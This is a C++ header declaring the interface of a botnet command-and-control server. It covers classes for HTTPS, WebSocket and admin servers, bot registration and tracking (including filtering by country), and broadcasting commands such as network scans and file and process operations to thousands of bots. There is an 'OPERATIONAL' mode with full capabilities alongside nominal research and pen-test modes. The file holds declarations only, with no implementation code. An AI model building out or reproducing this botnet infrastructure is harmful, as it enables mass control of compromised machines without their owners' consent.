#pragma once

#include <memory>
#include <string>
#include <vector>
#include <map>
#include <atomic>
#include <mutex>
#include <thread>
#include <chrono>
#include <functional>
#include <boost/asio.hpp>
#include <boost/beast.hpp>
#include <nlohmann/json.hpp>

// Single codebase - same communication module used by bot clients
#include "../../common/protocol/packet_handler.h"
#include "../../common/protocol/message.h"
#include "../../common/crypto/encryption.h"
#include "../../common/utils/platform_utils.h"

namespace botnet {
namespace c2 {

/**
 * @brief Main C2 Server class - single codebase for all platforms
 * 
 * Comprehensive Command & Control server that manages bot clients.
 * Supports multiple communication channels, distributed architecture,
 * and both research and operational modes.
 */
class C2Server {
public:
    enum class ServerState {
        STOPPED,
        STARTING,
        RUNNING,
        STOPPING,
        ERROR_STATE
    };

    enum class OperationMode {
        RESEARCH,           // Safe research mode with full logging
        EDUCATIONAL,        // Educational demonstrations
        PENETRATION_TEST,   // Authorized pen testing
        RED_TEAM,          // Red team exercises
        OPERATIONAL        // Full operational capabilities
    };

    struct ServerConfiguration {
        // Network settings
        std::string bind_address{"0.0.0.0"};
        uint16_t https_port{8443};
        uint16_t websocket_port{8444};
        uint16_t admin_port{8445};
        bool enable_ssl{true};
        
        // SSL/TLS configuration
        std::string ssl_certificate_file;
        std::string ssl_private_key_file;
        std::string ssl_ca_file;
        bool require_client_certificates{false};
        
        // Database configuration
        std::string database_type{"postgresql"};
        std::string database_host{"localhost"};
        uint16_t database_port{5432};
        std::string database_name{"botnet_c2"};
        std::string database_username{"c2_user"};
        std::string database_password;
        
        // Security settings
        std::string server_private_key;
        std::string jwt_secret;
        std::chrono::hours session_timeout{24};
        bool enable_authentication{true};
        
        // Operational settings
        OperationMode operation_mode{OperationMode::RESEARCH};
        uint32_t max_concurrent_bots{10000};
        uint32_t max_commands_per_second{100};
        std::chrono::seconds bot_timeout{300};
        bool enable_bot_auto_registration{true};
        
        // Research mode settings
        std::string research_session_id;
        std::string research_institution;
        std::string principal_investigator;
        std::chrono::system_clock::time_point research_expiry;
        bool require_research_approval{true};
        
        // Logging and monitoring
        std::string log_level{"INFO"};
        bool enable_audit_logging{true};
        bool enable_metrics{true};
        std::string metrics_endpoint;
        
        // Dashboard settings
        bool enable_web_dashboard{true};
        std::string dashboard_path{"./web-dashboard"};
        std::string dashboard_title{"Botnet C2 Management"};
    };

    struct ServerStatistics {
        std::chrono::system_clock::time_point server_start_time;
        std::atomic<uint32_t> active_bots{0};
        std::atomic<uint32_t> total_bots_registered{0};
        std::atomic<uint32_t> commands_executed{0};
        std::atomic<uint64_t> bytes_received{0};
        std::atomic<uint64_t> bytes_sent{0};
        std::atomic<uint32_t> failed_authentications{0};
        std::atomic<uint32_t> successful_authentications{0};
        OperationMode current_mode;
        bool research_mode_active{false};
    };

public:
    explicit C2Server(boost::asio::io_context& io_context);
    ~C2Server();

    // Core server lifecycle
    bool Initialize(const ServerConfiguration& config);
    bool Start();
    void Stop();
    void Shutdown();
    
    // State management
    ServerState GetState() const;
    bool IsRunning() const;
    ServerStatistics GetStatistics() const;
    
    // Configuration management
    const ServerConfiguration& GetConfiguration() const;
    bool UpdateConfiguration(const ServerConfiguration& new_config);
    
    // Bot management
    uint32_t GetActiveBotCount() const;
    std::vector<std::string> GetConnectedBotIds() const;
    bool DisconnectBot(const std::string& bot_id);
    bool SendCommandToBot(const std::string& bot_id, const std::string& command, 
                         const nlohmann::json& parameters);
    bool SendCommandToAllBots(const std::string& command, const nlohmann::json& parameters);
    bool SendCommandToGroup(const std::vector<std::string>& bot_ids, 
                           const std::string& command, const nlohmann::json& parameters);
    
    // Research mode controls
    bool EnableResearchMode(const std::string& session_id, const std::string& institution);
    bool DisableResearchMode();
    bool IsResearchModeEnabled() const;
    std::vector<std::string> GetResearchLogs() const;
    
    // Administrative functions
    bool CreateAdminUser(const std::string& username, const std::string& password);
    bool AuthenticateUser(const std::string& username, const std::string& password);
    std::string GenerateJWTToken(const std::string& username);
    bool ValidateJWTToken(const std::string& token);
    
    // Emergency procedures
    void TriggerEmergencyShutdown(const std::string& reason);
    void DisconnectAllBots();
    void ClearAllData();

private:
    // Forward declarations for internal components
    class HTTPSServer;
    class WebSocketServer;
    class AdminServer;
    class BotManager;
    class CommandProcessor;
    class DatabaseManager;
    class DashboardManager;
    class SecurityManager;
    class ResearchController;

    boost::asio::io_context& io_context_;
    
    // Core components
    std::unique_ptr<HTTPSServer> https_server_;
    std::unique_ptr<WebSocketServer> websocket_server_;
    std::unique_ptr<AdminServer> admin_server_;
    std::unique_ptr<BotManager> bot_manager_;
    std::unique_ptr<CommandProcessor> command_processor_;
    std::unique_ptr<DatabaseManager> database_manager_;
    std::unique_ptr<DashboardManager> dashboard_manager_;
    std::unique_ptr<SecurityManager> security_manager_;
    std::unique_ptr<ResearchController> research_controller_;
    
    // Server state
    std::atomic<ServerState> state_;
    ServerConfiguration config_;
    mutable std::mutex config_mutex_;
    
    // Statistics
    ServerStatistics stats_;
    
    // Encryption and security
    std::unique_ptr<crypto::RSAKeyPair> server_keys_;
    std::unique_ptr<crypto::KeyManager> key_manager_;
    
    // Threading
    std::vector<std::unique_ptr<std::thread>> worker_threads_;
    
    // Research and safety
    std::atomic<bool> emergency_shutdown_triggered_;
    std::string emergency_shutdown_reason_;
    
    // Internal methods
    void SetState(ServerState new_state);
    bool InitializeComponents();
    bool InitializeSSL();
    bool InitializeDatabase();
    bool InitializeSecurity();
    bool StartServers();
    void StopServers();
    
    // Message handling
    void HandleBotConnection(const std::string& bot_id);
    void HandleBotDisconnection(const std::string& bot_id);
    void HandleBotMessage(const std::string& bot_id, std::unique_ptr<protocol::Message> message);
    void HandleBotHeartbeat(const std::string& bot_id);
    
    // Command distribution
    bool DistributeCommand(const std::vector<std::string>& target_bots,
                          const std::string& command,
                          const nlohmann::json& parameters);
    
    // Research mode enforcement
    void ApplyResearchModeConstraints();
    void LogResearchActivity(const std::string& activity);
    
    // Statistics updates
    void UpdateStatistics();
    void IncrementBotCount();
    void DecrementBotCount();
    void UpdateTrafficStats(uint64_t bytes_sent, uint64_t bytes_received);
};

/**
 * @brief HTTPS server for primary bot communication
 */
class C2Server::HTTPSServer {
public:
    explicit HTTPSServer(boost::asio::io_context& io_context, C2Server& parent);
    ~HTTPSServer();

    bool Initialize(const ServerConfiguration& config);
    bool Start();
    void Stop();
    bool IsRunning() const;

private:
    boost::asio::io_context& io_context_;
    C2Server& parent_;
    
    std::unique_ptr<boost::asio::ip::tcp::acceptor> acceptor_;
    boost::asio::ssl::context ssl_context_;
    
    ServerConfiguration config_;
    std::atomic<bool> running_;
    
    void StartAccept();
    void HandleAccept(std::shared_ptr<boost::beast::ssl_stream<boost::beast::tcp_stream>> stream,
                     const boost::system::error_code& ec);
    void HandleSession(std::shared_ptr<boost::beast::ssl_stream<boost::beast::tcp_stream>> stream);
    
    void ProcessHTTPRequest(const boost::beast::http::request<boost::beast::http::string_body>& request,
                           boost::beast::http::response<boost::beast::http::string_body>& response);
    
    // API endpoints
    void HandleBotRegistration(const nlohmann::json& request_data, nlohmann::json& response_data);
    void HandleBotHeartbeat(const nlohmann::json& request_data, nlohmann::json& response_data);
    void HandleBotMessage(const nlohmann::json& request_data, nlohmann::json& response_data);
    void HandleCommandResponse(const nlohmann::json& request_data, nlohmann::json& response_data);
    
    // Authentication
    bool AuthenticateBot(const std::string& bot_id, const std::string& signature);
    std::string ExtractBotId(const boost::beast::http::request<boost::beast::http::string_body>& request);
};

/**
 * @brief WebSocket server for real-time bot communication
 */
class C2Server::WebSocketServer {
public:
    explicit WebSocketServer(boost::asio::io_context& io_context, C2Server& parent);
    ~WebSocketServer();

    bool Initialize(const ServerConfiguration& config);
    bool Start();
    void Stop();
    bool IsRunning() const;
    
    bool SendMessageToBot(const std::string& bot_id, std::unique_ptr<protocol::Message> message);
    bool BroadcastMessage(std::unique_ptr<protocol::Message> message);

private:
    boost::asio::io_context& io_context_;
    C2Server& parent_;
    
    std::unique_ptr<boost::asio::ip::tcp::acceptor> acceptor_;
    boost::asio::ssl::context ssl_context_;
    
    // Connected bot sessions
    std::map<std::string, std::shared_ptr<class WebSocketSession>> bot_sessions_;
    mutable std::mutex sessions_mutex_;
    
    ServerConfiguration config_;
    std::atomic<bool> running_;
    
    void StartAccept();
    void HandleAccept(std::shared_ptr<boost::beast::ssl_stream<boost::beast::tcp_stream>> stream,
                     const boost::system::error_code& ec);
    
    void AddBotSession(const std::string& bot_id, std::shared_ptr<WebSocketSession> session);
    void RemoveBotSession(const std::string& bot_id);
    
    // Session management
    class WebSocketSession;
};

/**
 * @brief Administrative server for management interface
 */
class C2Server::AdminServer {
public:
    explicit AdminServer(boost::asio::io_context& io_context, C2Server& parent);
    ~AdminServer();

    bool Initialize(const ServerConfiguration& config);
    bool Start();
    void Stop();
    bool IsRunning() const;

private:
    boost::asio::io_context& io_context_;
    C2Server& parent_;
    
    std::unique_ptr<boost::asio::ip::tcp::acceptor> acceptor_;
    
    ServerConfiguration config_;
    std::atomic<bool> running_;
    
    void StartAccept();
    void HandleAccept(std::shared_ptr<boost::asio::ip::tcp::socket> socket,
                     const boost::system::error_code& ec);
    void HandleAdminSession(std::shared_ptr<boost::asio::ip::tcp::socket> socket);
    
    void ProcessAdminRequest(const boost::beast::http::request<boost::beast::http::string_body>& request,
                           boost::beast::http::response<boost::beast::http::string_body>& response);
    
    // Admin API endpoints
    void HandleLogin(const nlohmann::json& request_data, nlohmann::json& response_data);
    void HandleGetBots(const nlohmann::json& request_data, nlohmann::json& response_data);
    void HandleSendCommand(const nlohmann::json& request_data, nlohmann::json& response_data);
    void HandleGetStatistics(const nlohmann::json& request_data, nlohmann::json& response_data);
    void HandleGetLogs(const nlohmann::json& request_data, nlohmann::json& response_data);
    void HandleServerControl(const nlohmann::json& request_data, nlohmann::json& response_data);
    
    // Static file serving for dashboard
    void ServeStaticFile(const std::string& file_path,
                        boost::beast::http::response<boost::beast::http::string_body>& response);
    std::string GetMimeType(const std::string& file_extension);
    
    // Authentication
    bool AuthenticateAdmin(const std::string& token);
};

/**
 * @brief Bot manager for tracking and managing connected bots
 */
class C2Server::BotManager {
public:
    struct BotInfo {
        std::string bot_id;
        std::string ip_address;
        std::string hostname;
        std::string platform;
        std::string version;
        std::chrono::system_clock::time_point connected_at;
        std::chrono::system_clock::time_point last_heartbeat;
        std::string country_code;
        bool research_mode;
        std::string research_session_id;
        nlohmann::json system_info;
        nlohmann::json capabilities;
        uint32_t commands_executed;
        bool active;
    };

public:
    explicit BotManager(C2Server& parent);
    ~BotManager();

    bool Initialize(const ServerConfiguration& config);
    
    // Bot lifecycle management
    bool RegisterBot(const std::string& bot_id, const BotInfo& info);
    bool UnregisterBot(const std::string& bot_id);
    bool UpdateBotHeartbeat(const std::string& bot_id);
    bool UpdateBotInfo(const std::string& bot_id, const nlohmann::json& info);
    
    // Bot queries
    std::vector<std::string> GetActiveBotIds() const;
    std::vector<BotInfo> GetAllBots() const;
    BotInfo GetBotInfo(const std::string& bot_id) const;
    bool IsBotActive(const std::string& bot_id) const;
    uint32_t GetActiveBotCount() const;
    
    // Bot grouping and filtering
    std::vector<std::string> GetBotsByPlatform(const std::string& platform) const;
    std::vector<std::string> GetBotsByCountry(const std::string& country_code) const;
    std::vector<std::string> GetResearchBots() const;
    std::vector<std::string> GetBotsInTimeRange(std::chrono::system_clock::time_point start,
                                               std::chrono::system_clock::time_point end) const;
    
    // Bot health monitoring
    void CheckBotHealth();
    void RemoveInactiveBots();
    std::vector<std::string> GetUnresponsiveBots() const;
    
    // Research mode
    void ApplyResearchConstraints();
    std::vector<std::string> GetResearchCompliantBots() const;

private:
    C2Server& parent_;
    
    std::map<std::string, BotInfo> bots_;
    mutable std::mutex bots_mutex_;
    
    ServerConfiguration config_;
    
    // Health monitoring
    std::unique_ptr<boost::asio::steady_timer> health_check_timer_;
    
    void StartHealthMonitoring();
    void HandleHealthCheck(const boost::system::error_code& ec);
    bool IsBotUnresponsive(const BotInfo& bot) const;
    
    // Database operations
    bool SaveBotToDatabase(const BotInfo& bot);
    bool LoadBotsFromDatabase();
    bool UpdateBotInDatabase(const std::string& bot_id, const BotInfo& bot);
    bool RemoveBotFromDatabase(const std::string& bot_id);
};

/**
 * @brief Command processor for handling bot commands and responses
 */
class C2Server::CommandProcessor {
public:
    struct CommandRequest {
        std::string command_id;
        std::string command_type;
        nlohmann::json parameters;
        std::vector<std::string> target_bots;
        std::chrono::system_clock::time_point created_at;
        std::chrono::system_clock::time_point expires_at;
        std::string issued_by;
        bool research_approved;
    };

    struct CommandResponse {
        std::string command_id;
        std::string bot_id;
        std::chrono::system_clock::time_point received_at;
        bool success;
        nlohmann::json result_data;
        std::string error_message;
        std::chrono::milliseconds execution_time;
    };

public:
    explicit CommandProcessor(C2Server& parent);
    ~CommandProcessor();

    bool Initialize(const ServerConfiguration& config);
    
    // Command execution
    std::string QueueCommand(const std::string& command_type,
                           const nlohmann::json& parameters,
                           const std::vector<std::string>& target_bots,
                           const std::string& issued_by = "admin");
    bool CancelCommand(const std::string& command_id);
    bool RetryCommand(const std::string& command_id);
    
    // Command responses
    bool ProcessCommandResponse(const std::string& command_id,
                              const std::string& bot_id,
                              const CommandResponse& response);
    
    // Command queries
    std::vector<CommandRequest> GetPendingCommands() const;
    std::vector<CommandResponse> GetCommandResponses(const std::string& command_id) const;
    CommandRequest GetCommandInfo(const std::string& command_id) const;
    
    // Built-in commands
    std::string ExecuteSystemInfo(const std::vector<std::string>& target_bots);
    std::string ExecuteNetworkScan(const std::vector<std::string>& target_bots,
                                 const std::string& target_network);
    std::string ExecuteFileOperation(const std::vector<std::string>& target_bots,
                                   const std::string& operation,
                                   const nlohmann::json& parameters);
    std::string ExecuteProcessOperation(const std::vector<std::string>& target_bots,
                                      const std::string& operation,
                                      const nlohmann::json& parameters);
    
    // Research mode commands
    std::string ExecuteResearchDataCollection(const std::vector<std::string>& target_bots);
    std::string ExecuteEnvironmentAnalysis(const std::vector<std::string>& target_bots);
    
    // Emergency commands
    void EmergencyStopAllBots();
    void DisconnectAllBots();

private:
    C2Server& parent_;
    
    std::map<std::string, CommandRequest> pending_commands_;
    std::map<std::string, std::vector<CommandResponse>> command_responses_;
    mutable std::mutex commands_mutex_;
    
    ServerConfiguration config_;
    
    // Command validation
    bool ValidateCommand(const CommandRequest& command) const;
    bool IsCommandAllowed(const std::string& command_type) const;
    bool IsResearchApproved(const std::string& command_type) const;
    
    // Command helpers
    std::string GenerateCommandId() const;
    bool IsCommandExpired(const CommandRequest& command) const;
    void CleanupExpiredCommands();
    
    // Database operations
    bool SaveCommandToDatabase(const CommandRequest& command);
    bool SaveResponseToDatabase(const CommandResponse& response);
};

} // namespace c2
} // namespace botnet
